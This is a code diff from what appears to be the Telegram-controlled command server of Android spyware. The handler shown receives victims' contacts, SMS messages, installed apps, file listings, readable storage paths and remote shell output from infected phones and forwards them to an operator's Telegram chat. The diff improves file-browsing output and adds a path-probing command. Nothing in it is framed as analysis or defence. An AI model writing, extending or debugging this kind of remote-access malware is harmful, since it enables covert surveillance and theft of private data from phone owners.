@@ -333,7 +333,7 @@ wss.on('connection', (ws, req) => {
 });
 
 // ============================================
-// COMMAND RESPONSE HANDLER - FIXED
+// COMMAND RESPONSE HANDLER - COMPLETE FIXED VERSION
 // ============================================
 function handleCommandResponse(deviceId, response) {
     if (!bot) return;
@@ -365,7 +365,7 @@ function handleCommandResponse(deviceId, response) {
         bot.sendMessage(chatId, msg).catch(()=>{});
     }
     
-    // CONTACTS - FIXED
+    // CONTACTS
     else if (response.data && response.data.contacts) {
         try {
             const contactsJson = response.data.contacts;
@@ -385,7 +385,7 @@ function handleCommandResponse(deviceId, response) {
         }
     }
     
-    // MESSAGES - FIXED
+    // MESSAGES
     else if (response.data && response.data.messages) {
         try {
             const messagesJson = response.data.messages;
@@ -405,7 +405,7 @@ function handleCommandResponse(deviceId, response) {
         }
     }
     
-    // APPS - FIXED
+    // APPS
     else if (response.data && response.data.apps) {
         try {
             const appsJson = response.data.apps;
@@ -421,26 +421,82 @@ function handleCommandResponse(deviceId, response) {
         } catch (e) {}
     }
     
-    // FILES - BROWSE
+    // FILES COMMAND (BROWSE)
     else if (response.data && response.data.files) {
         try {
-            const filesJson = response.data.files;
-            if (filesJson && filesJson !== "[]" && filesJson.length > 2) {
-                const filename = `files_${deviceId}_${Date.now()}.txt`;
-                const filepath = path.join(__dirname, 'uploads', filename);
-                fs.writeFileSync(filepath, filesJson);
-                bot.sendDocument(chatId, filepath, {
-                    caption: `📁 Files - ${model}\nPath: ${response.data.path || '/'}`
-                }).catch(()=>{});
-                setTimeout(() => fs.unlinkSync(filepath), 60000);
+            const filesData = response.data;
+            let message = `📁 *Files - ${model}*\nPath: \`${filesData.path || '/'}\`\n`;
+            
+            if (filesData.file_count > 0) {
+                message += `Files: ${filesData.file_count}\n\n`;
+                
+                // If it's a simple list of files from Java API
+                if (filesData.files && Array.isArray(filesData.files) && filesData.files.length > 0) {
+                    let fileList = '';
+                    filesData.files.slice(0, 20).forEach(f => {
+                        const icon = f.isDirectory ? '📁' : '📄';
+                        const size = f.size ? ` (${formatBytes(f.size)})` : '';
+                        const lastMod = f.lastModified ? `\n   📅 ${f.lastModified}` : '';
+                        fileList += `${icon} ${f.name}${size}${lastMod}\n`;
+                    });
+                    if (filesData.files.length > 20) {
+                        fileList += `... and ${filesData.files.length - 20} more`;
+                    }
+                    bot.sendMessage(chatId, message + fileList, { parse_mode: 'Markdown' }).catch(()=>{});
+                }
+                // If it's from shell command
+                else if (filesData.files && filesData.files.length > 0 && filesData.files[0].output) {
+                    const output = filesData.files[0].output.substring(0, 3000);
+                    bot.sendMessage(chatId, message + `\`\`\`\n${output}\n\`\`\``, { parse_mode: 'Markdown' }).catch(()=>{});
+                }
+            } else {
+                message += '📭 No files found';
+                bot.sendMessage(chatId, message, { parse_mode: 'Markdown' }).catch(()=>{});
             }
-        } catch (e) {}
+            
+            // Send suggestions if available
+            if (filesData.suggested_paths) {
+                let suggestMsg = '💡 Try these paths:\n';
+                filesData.suggested_paths.forEach(p => suggestMsg += `\`${p}\`\n`);
+                bot.sendMessage(chatId, suggestMsg, { parse_mode: 'Markdown' }).catch(()=>{});
+            }
+        } catch (e) {
+            bot.sendMessage(chatId, `❌ Error parsing files`).catch(()=>{});
+        }
     }
     
-    // SHELL OUTPUT
-    else if (response.output !== undefined) {
-        const output = response.output.substring(0, 4000);
-        bot.sendMessage(chatId, `🖥️ ${model}:\n\`\`\`\n${output}\n\`\`\``, { parse_mode: 'Markdown' }).catch(()=>{});
+    // CHECK PATHS COMMAND
+    else if (response.data && response.data.paths) {
+        try {
+            const paths = response.data.paths;
+            let message = `📂 *Accessible Paths - ${model}*\n\n`;
+            
+            Object.keys(paths).forEach(key => {
+                const path = paths[key];
+                if (path.exists && path.canRead) {
+                    const icon = path.isDirectory ? '📁' : '📄';
+                    message += `${icon} \`${path.description}\`\n`;
+                    if (path.contents_count !== undefined) {
+                        message += `   📊 ${path.contents_count} items\n`;
+                    }
+                }
+            });
+            
+            message += `\n📱 Android: ${response.data.android_version || '?'}`;
+            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' }).catch(()=>{});
+        } catch (e) {
+            bot.sendMessage(chatId, `❌ Error parsing paths`).catch(()=>{});
+        }
+    }
+    
+    // SHELL OUTPUT - FIXED
+    else if (response.data && response.data.output !== undefined) {
+        const output = response.data.output.substring(0, 4000);
+        const exitCode = response.data.exitCode !== undefined ? `\nExit code: ${response.data.exitCode}` : '';
+        bot.sendMessage(chatId, 
+            `🖥️ ${model}:\n\`\`\`\n${output}\n\`\`\`${exitCode}`, 
+            { parse_mode: 'Markdown' }
+        ).catch(()=>{});
     }
     
     // CALL
